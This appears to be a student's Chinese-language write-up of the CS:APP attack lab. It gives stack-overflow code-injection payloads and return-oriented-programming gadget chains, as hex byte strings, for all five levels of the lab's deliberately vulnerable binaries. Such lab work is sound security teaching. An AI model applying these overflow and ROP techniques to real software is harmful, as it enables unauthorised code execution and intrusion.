attack lab
### 和实验内容相关的指令 ###
1.sudo gcc -c asm.s(asm.s中存放汇编代码)
2.objdump -d + 文件名(可以查看上一步中生成的机器码，或者查看题目文件的汇编代码)
3.cat cookie.txt | ./hex2raw | ./rtarget(用于确认答案)

### 1.level1 ###
要求:getbuf返回到touch1
先反汇编getbug，如下
```python
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```
这不就是"a"* 0x28+ad_touch1,touch1地址为0x4017c0
payload如下
```python
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00
```

### 2.level2 ###
要求:ret touch2时，touch2的参数需要为cookie(一开始以为栈的地址是随机的，没想到是固定的，而且可写可读)
rsp_ad=0x5561dc78,cookie=0x59b997fa，touch2_ad=0x4017ec
mov %0x59b997fa,%rdi的机器码为bf fa 97 b9 59，ret的机器码为c3
payload如下
```python
BF FA 97 B9 59 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 EC 17 40 00 00 00 00 00
```
一开始mov $0x59b997f，%rdi,没加$，导致反汇编的机器码一直是错的......

### 3.level3 ###
要求:ret touch3时，touch3的参数需要指向cookie
cookie=0x59b997fa,ad->cookie=0x5561dc7e,touch3=0x4018fa
payload
```python
bf b0 dc 61 55 c3 fa 97 b9 59 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 fa 18 40 00 00 00 00 00 35 39 62 39
39 37 66 61 00 00 00 00
```
没看懂这个题目的要求，我以为那个cookie为0x59b997fa，16进制填fa 97...就可以了，结果是每一位都要用ascii的形式表达
，然后注意字符串的位置要在ret 后面

### 4.level4 ###
要求:实现level2通过他给的gadgets
rtarget用objdump反汇编出来看不到gadgets就离谱，于是我默默的输入了ROPgadget，
pop_rdi=0x40141b,cookie=0x59b997fa,touch2_ad=0x4017ec
payload
```python
BF 7E DC 61 55 C3 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 1B 14 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 EC 17 40 00 00 00 00 00
```

### 5.level5 ###
要求:实现level3，栈地址开了随机化，这就有点东西了，
gets_ad=0x401b60,ad=0x00605000，touch3_ad=0x4018fa
pop_rdi=0x000000000040141b,pop_rsi=0x0000000000401383，
思路:还是和level3一样，问题是怎么得到栈的地址,我一开始想的是通过mov rsp,rdi；但是我反汇编出来的没有mov rsp,rdi或者其他可以利用传rsp的就很离谱(通过read将字符串读到可写段上应该也可以，只是，由于hex2raw的问题，不好控制输入)
payload(参考https://blog.csdn.net/weixin_41256413/article/details/80463280)
```python
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1a 40 00 00 00 00 00 c5 19 40 00 00 00 00 00 ab 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 dd 19 40 00 00 00 00 00 34 1a 40 00 00 00 00 00 13 1a 40 00 00 00 00 00 d6 19 40 00 00 00 00 00 c5 19 40 00 00 00 00 00 fa 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00
```
